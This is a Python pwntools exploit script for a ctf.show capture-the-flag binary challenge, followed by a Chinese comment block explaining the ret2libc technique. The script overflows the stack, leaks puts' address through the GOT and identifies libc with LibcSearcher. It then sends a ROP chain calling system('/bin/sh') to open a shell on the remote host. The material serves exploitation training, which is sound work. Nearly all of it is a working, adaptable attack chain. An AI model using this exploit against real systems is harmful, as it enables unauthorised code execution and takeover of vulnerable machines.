from pwn import *
from LibcSearcher import *

p = remote('pwn.challenge.ctf.show', 28219)
elf = ELF('../code/pwn')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
ctfshow = elf.sym['ctfshow']

pop_rdi = 0x4008e3
ret = 0x400576
offset = 0x110

payload1 = b'a' * (offset - 4) + b'\x18' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ctfshow)
p.recvuntil('T^T\n')
p.sendline(payload1)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))

libc = LibcSearcher('puts', puts_addr)

libcbase = puts_addr - libc.dump('puts')

sys_addr = libcbase + libc.dump('system')
bin_sh_addr = libcbase + libc.dump('str_bin_sh')

payload2 = b'a' * (offset - 4) + b'\x18' + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)
# p.recvuntil('T^T\n')
p.sendline(payload2)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2libc - 返回libc库函数
2. 核心原理：
   - 程序没有后门函数，但动态链接了libc
   - 利用栈溢出跳转到libc中的函数（如system）
   - 需要泄露libc地址或已知libc版本
3. 利用方式：
   - 泄露libc地址：通过GOT表泄露函数地址，计算libc基址
   - 直接利用：程序提供libc地址或已知libc版本
4. 关键步骤：
   - 泄露libc函数地址（如puts、write）
   - 使用LibcSearcher识别libc版本
   - 计算system和/bin/sh地址
   - 构造ROP链调用system("/bin/sh")
5. 注意：64位需要pop_rdi gadget传递参数
"""
